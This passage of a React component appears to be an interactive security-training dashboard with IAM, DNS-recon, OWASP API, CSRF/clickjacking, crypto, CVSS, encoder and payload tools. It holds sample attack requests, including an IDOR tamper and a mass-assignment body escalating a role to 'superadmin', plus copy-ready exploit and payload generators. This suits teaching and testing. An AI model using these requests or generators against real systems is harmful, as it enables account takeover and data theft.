                        <div className="ai-nav-chips">
                            {SAMPLE_IAM_POLICIES.map((sp, idx) => (
                                <button
                                    key={idx}
                                    className="demo-role-chip"
                                    onClick={() => { scanIamPolicy(sp.json); playChime(); }}
                                >
                                    {sp.name}
                                </button>
                            ))}
                        </div>
                    </div>

                    <div className="overview-grid" style={{ gridTemplateColumns: '1.2fr 1fr', gap: '20px' }}>
                        <div>
                            <label className="tool-input-label">IAM POLICY JSON DOCUMENT:</label>
                            <textarea
                                className="notes-textarea mt-8"
                                rows="12"
                                value={iamPolicyInput}
                                onChange={(e) => scanIamPolicy(e.target.value)}
                                style={{ fontFamily: 'monospace', fontSize: '0.82rem' }}
                            />
                        </div>

                        <div>
                            <span className="projects-badge-tag">SECURITY AUDIT & FINDINGS ({iamFindings.length})</span>
                            <div className="flex-column gap-10 mt-10">
                                {iamFindings.map((f, i) => (
                                    <div
                                        key={i}
                                        className="glass-card"
                                        style={{
                                            margin: 0,
                                            padding: '12px',
                                            borderColor: f.severity === 'CRITICAL' ? 'rgba(239, 68, 68, 0.4)' : f.severity === 'HIGH' ? 'rgba(249, 115, 22, 0.4)' : 'rgba(34, 197, 94, 0.4)',
                                            background: f.severity === 'CRITICAL' ? 'rgba(239, 68, 68, 0.08)' : 'rgba(0, 0, 0, 0.35)'
                                        }}
                                    >
                                        <div className="flex-space-between-center mb-4">
                                            <strong style={{ fontSize: '0.88rem', color: f.severity === 'CRITICAL' ? '#f87171' : f.severity === 'HIGH' ? '#fbbf24' : '#4ade80' }}>
                                                {f.title}
                                            </strong>
                                            <span className={`cvss-score-pill cvss-${f.severity.toLowerCase()}`} style={{ fontSize: '0.7rem', padding: '2px 6px' }}>
                                                {f.severity}
                                            </span>
                                        </div>
                                        <p style={{ margin: 0, fontSize: '0.8rem', color: '#cbd5e1', lineHeight: 1.4 }}>
                                            {f.desc}
                                        </p>
                                    </div>
                                ))}
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* 3. DNS & Subdomain Recon Simulator */}
            {tool === 'dns' && (
                <div className="glass-card">
                    <div className="flex-space-between-center flex-wrap gap-15 mb-20">
                        <div>
                            <h3 className="tool-section-title" style={{ margin: 0 }}>Interactive DNS & Subdomain Reconnaissance Engine</h3>
                            <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', margin: '4px 0 0 0' }}>
                                Enumerates A, CNAME, MX, TXT records, checks DMARC/SPF spoofing posture, and detects dangling CNAME takeovers.
                            </p>
                        </div>
                    </div>

                    <div className="tool-input-group mb-20">
                        <label className="tool-input-label">TARGET ROOT DOMAIN:</label>
                        <div className="flex-gap-10">
                            <input
                                type="text"
                                className="search-input"
                                style={{ flex: 1 }}
                                value={reconDomain}
                                onChange={(e) => setReconDomain(e.target.value)}
                            />
                            <button className="site-btn tool-btn" onClick={() => playChime()}>
                                Resolve Records
                            </button>
                        </div>
                    </div>

                    <div className="overview-grid" style={{ gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '15px' }}>
                        {/* A Records */}
                        <div className="glass-card" style={{ margin: 0 }}>
                            <div className="flex-space-between-center mb-6">
                                <span className="projects-badge-tag" style={{ background: 'rgba(6, 182, 212, 0.15)', color: '#22d3ee' }}>A RECORDS (IPv4)</span>
                            </div>
                            <div className="tool-dir-cmd-box" style={{ fontSize: '0.8rem' }}>
                                {reconDomain} &rarr; 198.51.100.42<br />
                                api.{reconDomain} &rarr; 198.51.100.50<br />
                                vpn.{reconDomain} &rarr; 198.51.100.1
                            </div>
                        </div>

                        {/* CNAME Takeover Check */}
                        <div className="glass-card" style={{ margin: 0, borderColor: 'rgba(239, 68, 68, 0.4)' }}>
                            <div className="flex-space-between-center mb-6">
                                <span className="projects-badge-tag" style={{ background: 'rgba(239, 68, 68, 0.15)', color: '#f87171' }}>CNAME (SUBDOMAIN TAKEOVER)</span>
                            </div>
                            <div className="tool-dir-cmd-box" style={{ fontSize: '0.8rem', color: '#fca5a5' }}>
                                staging.{reconDomain} &rarr; target-staging.s3-website-us-east-1.amazonaws.com<br />
                                ⚠️ <strong>Status:</strong> Unclaimed S3 Bucket detected! Attacker can register bucket name and take over domain.
                            </div>
                        </div>

                        {/* SPF & Email Spoofing */}
                        <div className="glass-card" style={{ margin: 0, borderColor: 'rgba(234, 179, 8, 0.4)' }}>
                            <div className="flex-space-between-center mb-6">
                                <span className="projects-badge-tag" style={{ background: 'rgba(234, 179, 8, 0.15)', color: '#fde047' }}>TXT (SPF & DMARC POSTURE)</span>
                            </div>
                            <div className="tool-dir-cmd-box" style={{ fontSize: '0.8rem' }}>
                                <strong>SPF:</strong> "v=spf1 include:_spf.google.com ~all"<br />
                                <strong>DMARC:</strong> "v=DMARC1; p=none; sp=none;"<br />
                                ⚠️ <strong>Vulnerability:</strong> DMARC <code>p=none</code> allows phishing emails spoofing @{reconDomain} to bypass inbox rejection!
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* 4. OWASP API Top 10 Security Suite */}
            {tool === 'api' && (
                <div className="glass-card">
                    <div className="flex-space-between-center flex-wrap gap-15 mb-20">
                        <div>
                            <h3 className="tool-section-title" style={{ margin: 0 }}>OWASP API Security Top 10 Testing Sandbox</h3>
                            <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', margin: '4px 0 0 0' }}>
                                Interactive vulnerability probes for Broken Object-Level Auth (BOLA/IDOR), Mass Assignment, and OAuth 2.0 PKCE flow.
                            </p>
                        </div>

                        <div className="ai-nav-chips">
                            <button className={`ai-nav-btn ${apiMode === 'bola' ? 'active' : ''}`} onClick={() => { setApiMode('bola'); playChime(); }}>
                                API1: BOLA / IDOR
                            </button>
                            <button className={`ai-nav-btn ${apiMode === 'mass_assign' ? 'active' : ''}`} onClick={() => { setApiMode('mass_assign'); playChime(); }}>
                                API3: Mass Assignment
                            </button>
                            <button className={`ai-nav-btn ${apiMode === 'oauth' ? 'active' : ''}`} onClick={() => { setApiMode('oauth'); playChime(); }}>
                                OAuth 2.0 & PKCE
                            </button>
                        </div>
                    </div>

                    {/* BOLA / IDOR Testing Mode */}
                    {apiMode === 'bola' && (
                        <div className="overview-grid" style={{ gridTemplateColumns: '1.2fr 1fr', gap: '20px' }}>
                            <div>
                                <span className="projects-badge-tag">BOLA / BROKEN OBJECT-LEVEL AUTHORIZATION (API1:2023)</span>
                                <div className="tool-input-group mt-12 mb-10">
                                    <label className="tool-input-label">LOGGED IN AS USER: <code>jdoe (ID: 1042)</code></label>
                                    <label className="tool-input-label mt-8">TAMPER TARGET USER_ID IN ENDPOINT PATH:</label>
                                    <div className="flex-gap-10">
                                        <input
                                            type="text"
                                            className="search-input"
                                            value={bolaUserId}
                                            onChange={(e) => setBolaUserId(e.target.value)}
                                            style={{ flex: 1 }}
                                        />
                                    </div>
                                </div>

                                <div className="tool-dir-cmd-box mb-12" style={{ color: '#38bdf8' }}>
                                    GET /api/v2/users/<strong>{bolaUserId}</strong>/billing_invoices HTTP/1.1<br />
                                    Authorization: Bearer eyJhbGciOiJIUzI1Ni... (jdoe token)
                                </div>

                                <div className="project-mitigation-box" style={{ fontSize: '0.78rem' }}>
                                    💡 <strong>Vulnerability Mechanism:</strong> If the backend API only checks if the token is valid, but fails to assert <code>req.user.id === target_user_id</code>, any low-privileged user can enumerate and exfiltrate all tenant records!
                                </div>
                            </div>

                            <div>
                                <span className="projects-badge-tag">SERVER RESPONSE REFLECTION</span>
                                <div className="ai-code-output-card mt-12">
                                    <pre className="modal-code-box" style={{ margin: 0, maxHeight: '220px', color: bolaUserId === '1001' ? '#f87171' : '#4ade80' }}>
                                        <code>{bolaUserId === '1001' ? `HTTP/1.1 200 OK (CRITICAL IDOR EXPLOITED)
{
  "user_id": 1001,
  "name": "Global Root Admin",
  "email": "ceo@target-corp.com",
  "credit_card": "4111-XXXX-XXXX-9921",
  "total_spend": "$4,290,000",
  "pci_dss_compliant": false
}` : `{
  "user_id": ${bolaUserId},
  "name": "Standard Account",
  "status": "active"
}`}</code>
                                    </pre>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* Mass Assignment Mode */}
                    {apiMode === 'mass_assign' && (
                        <div className="overview-grid" style={{ gridTemplateColumns: '1.2fr 1fr', gap: '20px' }}>
                            <div>
                                <span className="projects-badge-tag">MASS ASSIGNMENT PRIVILEGE ESCALATION (API3:2023)</span>
                                <div className="tool-input-group mt-12 mb-10">
                                    <label className="tool-input-label">INJECT SENSITIVE ATTRIBUTE IN UPDATE BODY:</label>
                                    <select className="domain-select" style={{ width: '100%' }} value={massAssignRole} onChange={(e) => setMassAssignRole(e.target.value)}>
                                        <option value="admin">role: "admin" (Privilege Escalation)</option>
                                        <option value="superadmin">role: "superadmin" (Full Dominance)</option>
                                        <option value="verified_org">is_verified: true (Badge Spoofing)</option>
                                    </select>
                                </div>

                                <div className="tool-dir-cmd-box mb-12">
                                    PUT /api/v1/users/profile HTTP/1.1<br />
                                    Content-Type: application/json<br /><br />
                                    {`{\n  "email": "attacker@evil.com",\n  "${massAssignRole.startsWith('role') ? 'role' : 'is_verified'}": "${massAssignRole}"\n}`}
                                </div>
                            </div>

                            <div>
                                <span className="projects-badge-tag">OBJECT BINDING EVALUATION</span>
                                <div className="ai-code-output-card mt-12">
                                    <pre className="modal-code-box" style={{ margin: 0, color: '#f87171' }}>
                                        <code>{`HTTP/1.1 200 OK
{
  "status": "success",
  "message": "Profile updated without field allowlisting",
  "user": {
    "email": "attacker@evil.com",
    "role": "${massAssignRole}",
    "access_level": "SYSTEM_ADMIN"
  }
}`}</code>
                                    </pre>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* OAuth 2.0 Mode */}
                    {apiMode === 'oauth' && (
                        <div>
                            <span className="projects-badge-tag">OAUTH 2.0 AUTHORIZATION CODE WITH PKCE FLOW</span>
                            <div className="overview-grid mt-12" style={{ gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '10px' }}>
                                <div className="glass-card" style={{ margin: 0, padding: '12px' }}>
                                    <strong style={{ color: '#38bdf8', fontSize: '0.85rem' }}>1. Code Challenge (PKCE)</strong>
                                    <p style={{ fontSize: '0.78rem', color: '#cbd5e1', margin: '4px 0 0 0' }}>Client creates random <code>code_verifier</code> and sends <code>code_challenge = SHA256(verifier)</code>.</p>
                                </div>
                                <div className="glass-card" style={{ margin: 0, padding: '12px' }}>
                                    <strong style={{ color: '#a78bfa', fontSize: '0.85rem' }}>2. Auth Code Exchange</strong>
                                    <p style={{ fontSize: '0.78rem', color: '#cbd5e1', margin: '4px 0 0 0' }}>User logs in, IdP returns short-lived <code>authorization_code</code> via Redirect URI.</p>
                                </div>
                                <div className="glass-card" style={{ margin: 0, padding: '12px' }}>
                                    <strong style={{ color: '#4ade80', fontSize: '0.85rem' }}>3. Token Issuance</strong>
                                    <p style={{ fontSize: '0.78rem', color: '#cbd5e1', margin: '4px 0 0 0' }}>Client presents code + original <code>code_verifier</code>. IdP validates hash & grants access token.</p>
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            )}

            {/* 5. Web Exploit PoC Suite (CSRF / Clickjacking / CORS) */}
            {tool === 'csrf' && (
                <div className="glass-card">
                    <h3 className="tool-section-title">Web Exploit PoC Generator & Testbed</h3>
                    <p style={{ color: 'var(--text-secondary)', fontSize: '0.88rem', margin: '4px 0 16px 0' }}>
                        Generate self-submitting CSRF exploit HTML, preview Clickjacking iframe overlays, and analyze CORS origin reflections.
                    </p>

                    <div className="overview-grid" style={{ gridTemplateColumns: '1.2fr 1fr', gap: '20px' }}>
                        {/* CSRF Builder Form */}
                        <div>
                            <span className="projects-badge-tag">1-CLICK CSRF EXPLOIT GENERATOR</span>
                            <div className="tool-input-group mt-12 mb-10">
                                <label className="tool-input-label">TARGET ACTION URL:</label>
                                <input
                                    type="text"
                                    className="search-input"
                                    style={{ width: '100%' }}
                                    value={csrfAction}
                                    onChange={(e) => setCsrfAction(e.target.value)}
                                />
                            </div>
                            <div className="overview-grid mb-10">
                                <div>
                                    <label className="tool-input-label">HTTP METHOD:</label>
                                    <select className="domain-select" value={csrfMethod} onChange={(e) => setCsrfMethod(e.target.value)} style={{ width: '100%' }}>
                                        <option value="POST">POST</option>
                                        <option value="GET">GET</option>
                                    </select>
                                </div>
                                <div>
                                    <label className="tool-input-label">PARAMETERS (KEY=VAL&...):</label>
                                    <input
                                        type="text"
                                        className="search-input"
                                        value={csrfParams}
                                        onChange={(e) => setCsrfParams(e.target.value)}
                                        style={{ width: '100%' }}
                                    />
                                </div>
                            </div>

                            <div className="ai-code-output-card mt-12">
                                <div className="flex-space-between-center mb-8">
                                    <span className="ai-output-meta-label">GENERATED HTML EXPLOIT:</span>
                                    <button className="table-action-link" onClick={() => handleCopy(csrfHtml, 'csrf')}>
                                        {copiedKey === 'csrf' ? 'Copied!' : 'Copy Exploit HTML'}
                                    </button>
                                </div>
                                <pre className="modal-code-box" style={{ margin: 0, whiteSpace: 'pre-wrap', maxHeight: '200px' }}>
                                    <code>{csrfHtml}</code>
                                </pre>
                            </div>
                        </div>

                        {/* Clickjacking Visualizer */}
                        <div>
                            <span className="projects-badge-tag">CLICKJACKING OVERLAY SIMULATOR</span>
                            <div className="tool-input-group mt-12 mb-10">
                                <label className="tool-input-label">TARGET IFRAME URL:</label>
                                <input
                                    type="text"
                                    className="search-input"
                                    style={{ width: '100%' }}
                                    value={clickjackUrl}
                                    onChange={(e) => setClickjackUrl(e.target.value)}
                                />
                            </div>
                            <div className="tool-input-group mb-12">
                                <label className="tool-input-label">IFRAME OPACITY ({clickjackOpacity}%):</label>
                                <input
                                    type="range"
                                    min="0"
                                    max="100"
                                    value={clickjackOpacity}
                                    onChange={(e) => setClickjackOpacity(e.target.value)}
                                    style={{ width: '100%' }}
                                />
                            </div>

                            <div style={{ position: 'relative', height: '140px', background: '#020617', border: '1px solid rgba(255, 255, 255, 0.1)', borderRadius: '8px', overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                                <button className="site-btn tool-btn" style={{ position: 'absolute', zIndex: 1 }}>
                                    Claim $1,000 Bounty!
                                </button>
                                <div style={{ position: 'absolute', inset: 0, zIndex: 2, opacity: clickjackOpacity / 100, background: 'rgba(239, 68, 68, 0.4)', border: '2px dashed #ef4444', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#fff', fontSize: '0.82rem', fontWeight: 'bold' }}>
                                    [Victim Frame: Delete Account Button]
                                </div>
                            </div>
                            <p style={{ fontSize: '0.78rem', color: 'var(--text-muted)', margin: '8px 0 0 0' }}>
                                Drag opacity slider to 0% to see how a victim unknowingly clicks the hidden "Delete Account" button beneath the decoy prize!
                            </p>
                        </div>
                    </div>
                </div>
            )}

            {/* 6. Cryptography & Cipher Lab (RSA / Diffie-Hellman) */}
            {tool === 'crypto' && (
                <div className="glass-card">
                    <h3 className="tool-section-title">Cryptographic & Cipher Math Laboratory</h3>
                    <p style={{ color: 'var(--text-secondary)', fontSize: '0.88rem', margin: '4px 0 16px 0' }}>
                        Step-by-step mathematical visualizer for RSA Asymmetric Key Generation, Modular Arithmetic, and Diffie-Hellman Key Exchange.
                    </p>

                    {/* RSA Visualizer */}
                    <div className="glass-card mb-20" style={{ background: 'rgba(0, 0, 0, 0.35)', margin: 0 }}>
                        <div className="flex-space-between-center mb-10">
                            <span className="projects-badge-tag" style={{ background: 'rgba(168, 85, 247, 0.2)', color: '#d8b4fe' }}>
                                RSA ASYMMETRIC ENCRYPTION STEP-BY-STEP MATH
                            </span>
                        </div>

                        <div className="overview-grid mb-15">
                            <div>
                                <label className="tool-input-label">PRIME P:</label>
                                <input type="number" className="search-input" value={rsaP} onChange={(e) => setRsaP(e.target.value)} style={{ width: '100%' }} />
                            </div>
                            <div>
                                <label className="tool-input-label">PRIME Q:</label>
                                <input type="number" className="search-input" value={rsaQ} onChange={(e) => setRsaQ(e.target.value)} style={{ width: '100%' }} />
                            </div>
                            <div>
                                <label className="tool-input-label">MESSAGE INT (M &lt; N):</label>
                                <input type="number" className="search-input" value={rsaMsg} onChange={(e) => setRsaMsg(e.target.value)} style={{ width: '100%' }} />
                            </div>
                        </div>

                        <div className="overview-grid" style={{ gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '10px' }}>
                            <div className="glass-card" style={{ margin: 0, padding: '10px' }}>
                                <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>1. MODULUS N = P * Q:</span>
                                <div style={{ fontSize: '1.1rem', fontWeight: 800, color: '#38bdf8' }}>{rsaComputed.n}</div>
                            </div>
                            <div className="glass-card" style={{ margin: 0, padding: '10px' }}>
                                <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>2. TOTIENT Φ(N) = (P-1)(Q-1):</span>
                                <div style={{ fontSize: '1.1rem', fontWeight: 800, color: '#c084fc' }}>{rsaComputed.phi}</div>
                            </div>
                            <div className="glass-card" style={{ margin: 0, padding: '10px' }}>
                                <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>3. PUBLIC KEY (E, N):</span>
                                <div style={{ fontSize: '1.1rem', fontWeight: 800, color: '#4ade80' }}>({rsaComputed.e}, {rsaComputed.n})</div>
                            </div>
                            <div className="glass-card" style={{ margin: 0, padding: '10px' }}>
                                <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)' }}>4. PRIVATE KEY D (MOD INV):</span>
                                <div style={{ fontSize: '1.1rem', fontWeight: 800, color: '#f87171' }}>{rsaComputed.d}</div>
                            </div>
                        </div>

                        <div className="overview-grid mt-10">
                            <div className="tool-dir-cmd-box" style={{ color: '#fbbf24' }}>
                                Encrypted Ciphertext C = M^e mod N = {rsaComputed.m}^{rsaComputed.e} mod {rsaComputed.n} = <strong>{rsaComputed.ciphertext}</strong>
                            </div>
                            <div className="tool-dir-cmd-box" style={{ color: '#4ade80' }}>
                                Decrypted Message M' = C^d mod N = {rsaComputed.ciphertext}^{rsaComputed.d} mod {rsaComputed.n} = <strong>{rsaComputed.decrypted}</strong>
                            </div>
                        </div>
                    </div>

                    {/* Diffie-Hellman Visualizer */}
                    <div className="glass-card mt-20" style={{ background: 'rgba(0, 0, 0, 0.35)', margin: 0 }}>
                        <span className="projects-badge-tag" style={{ background: 'rgba(59, 130, 246, 0.2)', color: '#93c5fd' }}>
                            DIFFIE-HELLMAN KEY EXCHANGE SIMULATOR
                        </span>
                        <div className="overview-grid mt-12 mb-10">
                            <div>
                                <label className="tool-input-label">PRIME P:</label>
                                <input type="number" className="search-input" value={dhP} onChange={(e) => setDhP(e.target.value)} style={{ width: '100%' }} />
                            </div>
                            <div>
                                <label className="tool-input-label">GENERATOR G:</label>
                                <input type="number" className="search-input" value={dhG} onChange={(e) => setDhG(e.target.value)} style={{ width: '100%' }} />
                            </div>
                            <div>
                                <label className="tool-input-label">ALICE SECRET A:</label>
                                <input type="number" className="search-input" value={dhAliceA} onChange={(e) => setDhAliceA(e.target.value)} style={{ width: '100%' }} />
                            </div>
                            <div>
                                <label className="tool-input-label">BOB SECRET B:</label>
                                <input type="number" className="search-input" value={dhBobB} onChange={(e) => setDhBobB(e.target.value)} style={{ width: '100%' }} />
                            </div>
                        </div>

                        <div className="overview-grid">
                            <div className="tool-dir-cmd-box" style={{ color: '#38bdf8' }}>
                                Alice sends Public A = {dhComputed.g}^{dhComputed.a} mod {dhComputed.p} = <strong>{dhComputed.A}</strong>
                            </div>
                            <div className="tool-dir-cmd-box" style={{ color: '#c084fc' }}>
                                Bob sends Public B = {dhComputed.g}^{dhComputed.b} mod {dhComputed.p} = <strong>{dhComputed.B}</strong>
                            </div>
                        </div>
                        <div className="tool-dir-cmd-box mt-10" style={{ color: '#4ade80', textAlign: 'center', fontSize: '0.95rem' }}>
                            Derived Shared Secret Key = <strong>{dhComputed.secretAlice}</strong> (Alice: B^a mod p = {dhComputed.secretAlice} | Bob: A^b mod p = {dhComputed.secretBob})
                        </div>
                    </div>
                </div>
            )}

            {/* 7. CVSS 3.1 Calculator */}
            {tool === 'cvss' && (
                <div className="glass-card">
                    <div className="flex-space-between-center flex-wrap gap-15 mb-20">
                        <div>
                            <h3 className="tool-section-title" style={{ margin: 0 }}>CVSS v3.1 Severity Calculator</h3>
                            <p style={{ color: 'var(--text-secondary)', fontSize: '0.85rem', margin: '4px 0 0 0' }}>
                                Common Vulnerability Scoring System official standard base score estimator.
                            </p>
                        </div>

                        <div className="flex-gap-10 align-center">
                            <div className={`cvss-score-pill cvss-${cvssScore.severity.toLowerCase()}`} style={{ fontSize: '1.4rem', padding: '6px 18px', fontWeight: 800 }}>
                                {cvssScore.score} {cvssScore.severity.toUpperCase()}
                            </div>
                            <button className="site-btn tool-btn" onClick={() => handleCopy(cvssScore.vector, 'cvss')}>
                                {copiedKey === 'cvss' ? 'Copied Vector!' : 'Copy Vector'}
                            </button>
                        </div>
                    </div>

                    <div className="tool-dir-cmd-box mb-20" style={{ fontSize: '0.85rem', color: '#38bdf8' }}>
                        {cvssScore.vector}
                    </div>

                    {/* Metric Selectors Grid */}
                    <div className="overview-grid" style={{ gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '15px' }}>
                        <div className="glass-card" style={{ margin: 0 }}>
                            <label className="tool-input-label">Attack Vector (AV):</label>
                            <div className="flex-gap-6 flex-wrap mt-6">
                                {[['N', 'Network'], ['A', 'Adjacent'], ['L', 'Local'], ['P', 'Physical']].map(([val, label]) => (
                                    <button
                                        key={val}
                                        className={`ai-nav-btn ${cvss.av === val ? 'active' : ''}`}
                                        style={{ fontSize: '0.78rem', padding: '4px 10px' }}
                                        onClick={() => setCvss({ ...cvss, av: val })}
                                    >
                                        {label} ({val})
                                    </button>
                                ))}
                            </div>
                        </div>

                        <div className="glass-card" style={{ margin: 0 }}>
                            <label className="tool-input-label">Attack Complexity (AC):</label>
                            <div className="flex-gap-6 flex-wrap mt-6">
                                {[['L', 'Low'], ['H', 'High']].map(([val, label]) => (
                                    <button
                                        key={val}
                                        className={`ai-nav-btn ${cvss.ac === val ? 'active' : ''}`}
                                        style={{ fontSize: '0.78rem', padding: '4px 10px' }}
                                        onClick={() => setCvss({ ...cvss, ac: val })}
                                    >
                                        {label} ({val})
                                    </button>
                                ))}
                            </div>
                        </div>

                        <div className="glass-card" style={{ margin: 0 }}>
                            <label className="tool-input-label">Privileges Required (PR):</label>
                            <div className="flex-gap-6 flex-wrap mt-6">
                                {[['N', 'None'], ['L', 'Low'], ['H', 'High']].map(([val, label]) => (
                                    <button
                                        key={val}
                                        className={`ai-nav-btn ${cvss.pr === val ? 'active' : ''}`}
                                        style={{ fontSize: '0.78rem', padding: '4px 10px' }}
                                        onClick={() => setCvss({ ...cvss, pr: val })}
                                    >
                                        {label} ({val})
                                    </button>
                                ))}
                            </div>
                        </div>

                        <div className="glass-card" style={{ margin: 0 }}>
                            <label className="tool-input-label">User Interaction (UI):</label>
                            <div className="flex-gap-6 flex-wrap mt-6">
                                {[['N', 'None'], ['R', 'Required']].map(([val, label]) => (
                                    <button
                                        key={val}
                                        className={`ai-nav-btn ${cvss.ui === val ? 'active' : ''}`}
                                        style={{ fontSize: '0.78rem', padding: '4px 10px' }}
                                        onClick={() => setCvss({ ...cvss, ui: val })}
                                    >
                                        {label} ({val})
                                    </button>
                                ))}
                            </div>
                        </div>

                        <div className="glass-card" style={{ margin: 0 }}>
                            <label className="tool-input-label">Scope (S):</label>
                            <div className="flex-gap-6 flex-wrap mt-6">
                                {[['U', 'Unchanged'], ['C', 'Changed']].map(([val, label]) => (
                                    <button
                                        key={val}
                                        className={`ai-nav-btn ${cvss.s === val ? 'active' : ''}`}
                                        style={{ fontSize: '0.78rem', padding: '4px 10px' }}
                                        onClick={() => setCvss({ ...cvss, s: val })}
                                    >
                                        {label} ({val})
                                    </button>
                                ))}
                            </div>
                        </div>

                        <div className="glass-card" style={{ margin: 0 }}>
                            <label className="tool-input-label">Confidentiality / Integrity / Availability:</label>
                            <div className="flex-gap-8 mt-6">
                                <select className="domain-select" style={{ fontSize: '0.75rem', padding: '4px 8px' }} value={cvss.c} onChange={(e) => setCvss({ ...cvss, c: e.target.value })}>
                                    <option value="N">C: None</option>
                                    <option value="L">C: Low</option>
                                    <option value="H">C: High</option>
                                </select>
                                <select className="domain-select" style={{ fontSize: '0.75rem', padding: '4px 8px' }} value={cvss.i} onChange={(e) => setCvss({ ...cvss, i: e.target.value })}>
                                    <option value="N">I: None</option>
                                    <option value="L">I: Low</option>
                                    <option value="H">I: High</option>
                                </select>
                                <select className="domain-select" style={{ fontSize: '0.75rem', padding: '4px 8px' }} value={cvss.a} onChange={(e) => setCvss({ ...cvss, a: e.target.value })}>
                                    <option value="N">A: None</option>
                                    <option value="L">A: Low</option>
                                    <option value="H">A: High</option>
                                </select>
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* 8. Encoder / Decoder */}
            {tool === 'encoder' && (
                <div className="glass-card">
                    <h3 className="tool-section-title">2-Way Security Encoder & Obfuscator</h3>
                    <div className="flex-gap-10 mt-15 mb-15 flex-wrap">
                        {['base64', 'hex', 'url', 'html', 'rot13'].map(mode => (
                            <button
                                key={mode}
                                className={`ai-nav-btn ${encMode === mode ? 'active' : ''}`}
                                onClick={() => { setEncMode(mode); handleTransform(encInput, mode, encDirection); playChime(); }}
                            >
                                {mode.toUpperCase()}
                            </button>
                        ))}
                    </div>

                    <div className="flex-gap-10 mb-15">
                        <button
                            className={`site-btn tool-btn ${encDirection === 'encode' ? '' : 'secondary-btn'}`}
                            onClick={() => { setEncDirection('encode'); handleTransform(encInput, encMode, 'encode'); playChime(); }}
                        >
                            Encode
                        </button>
                        <button
                            className={`site-btn tool-btn ${encDirection === 'decode' ? '' : 'secondary-btn'}`}
                            onClick={() => { setEncDirection('decode'); handleTransform(encInput, encMode, 'decode'); playChime(); }}
                        >
                            Decode
                        </button>
                    </div>

                    <textarea
                        className="notes-textarea mb-15"
                        rows="3"
                        value={encInput}
                        placeholder="Enter payload string to transform..."
                        onChange={(e) => handleTransform(e.target.value, encMode, encDirection)}
                    />

                    <div className="ai-code-output-card">
                        <div className="flex-space-between-center mb-8">
                            <span className="ai-output-meta-label">TRANSFORMED RESULT ({encDirection.toUpperCase()} // {encMode.toUpperCase()}):</span>
                            <button className="table-action-link" onClick={() => handleCopy(encOutput, 'enc')}>{copiedKey === 'enc' ? 'Copied!' : 'Copy'}</button>
                        </div>
                        <pre className="modal-code-box" style={{ margin: 0, whiteSpace: 'pre-wrap', wordBreak: 'break-all' }}>
                            <code>{encOutput}</code>
                        </pre>
                    </div>
                </div>
            )}

            {/* 9. Payloads & Injection Sandbox */}
            {tool === 'payloads' && (
                <div className="glass-card">
                    <h3 className="tool-section-title">Interactive Payload & Web Exploitation Playground</h3>
                    <div className="flex-gap-10 mb-15 flex-wrap">
                        {Object.entries(PLAYLOAD_CATEGORIES).map(([k, v]) => (
                            <button
                                key={k}
                                className={`ai-nav-btn ${payloadCat === k ? 'active' : ''}`}
                                onClick={() => { setPayloadCat(k); setTestPayload(v.payloads[0].code); playChime(); }}
                            >
                                {v.name}
                            </button>
                        ))}
                    </div>

                    <div className="overview-grid" style={{ gridTemplateColumns: '1.2fr 1fr', gap: '20px' }}>
                        <div>
                            <label className="tool-input-label">PRE-CONFIGURED ATTACK VECTORS:</label>
                            <div className="flex-column gap-10 mt-10">
                                {PLAYLOAD_CATEGORIES[payloadCat].payloads.map((p, i) => (
                                    <div
                                        key={i}
                                        className="glass-card"
                                        style={{ margin: 0, padding: '12px', cursor: 'pointer', background: 'rgba(0, 0, 0, 0.4)' }}
                                        onClick={() => { setTestPayload(p.code); playChime(); }}
                                    >
                                        <div className="flex-space-between-center mb-4">
                                            <strong style={{ fontSize: '0.85rem', color: '#f8fafc' }}>{p.name}</strong>
                                            <button className="table-action-link" onClick={(e) => { e.stopPropagation(); handleCopy(p.code, `pl_${i}`); }}>
                                                {copiedKey === `pl_${i}` ? 'Copied!' : 'Copy'}
                                            </button>
                                        </div>
                                        <code style={{ fontSize: '0.78rem', color: '#22d3ee', wordBreak: 'break-all' }}>{p.code}</code>
                                    </div>
                                ))}
                            </div>
                        </div>

                        <div>
                            <label className="tool-input-label">PAYLOAD INSPECTOR & VERIFIER:</label>
                            <textarea
                                className="notes-textarea mt-10 mb-10"
                                rows="3"
                                value={testPayload}
                                onChange={(e) => setTestPayload(e.target.value)}
                            />
                            <div className="flex-gap-10">
                                <button className="site-btn tool-btn" onClick={() => handleCopy(testPayload, 'custom_pl')}>
                                    {copiedKey === 'custom_pl' ? 'Copied!' : 'Copy Payload'}
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* 10. Subnet Math */}
            {tool === 'subnet' && (
                <div className="glass-card">
                    <h3 className="tool-section-title">IPv4 Subnet & CIDR Bitwise Calculator</h3>
                    <div className="overview-grid mt-15 mb-20">
                        <div className="tool-input-group">
                            <label className="tool-input-label">IP ADDRESS:</label>
                            <input
                                type="text"
                                className="search-input"
                                style={{ width: '100%' }}
                                value={ipInput}
                                onChange={(e) => setIpInput(e.target.value)}
                            />
                        </div>
                        <div className="tool-input-group">
                            <label className="tool-input-label">CIDR PREFIX (/{cidrInput}):</label>
                            <input
                                type="number"
                                min="1"
                                max="32"
                                className="search-input"
                                style={{ width: '100%' }}
                                value={cidrInput}
                                onChange={(e) => setCidrInput(e.target.value)}
                            />
                        </div>
                    </div>

                    {subnetInfo && (
                        <div className="overview-grid">
                            <div className="glass-card" style={{ margin: 0 }}>
                                <span className="projects-badge-tag">NETWORK ADDRESS</span>
                                <div className="tool-dir-cmd-box mt-8">{subnetInfo.netIp}</div>
                            </div>
                            <div className="glass-card" style={{ margin: 0 }}>
                                <span className="projects-badge-tag">BROADCAST ADDRESS</span>
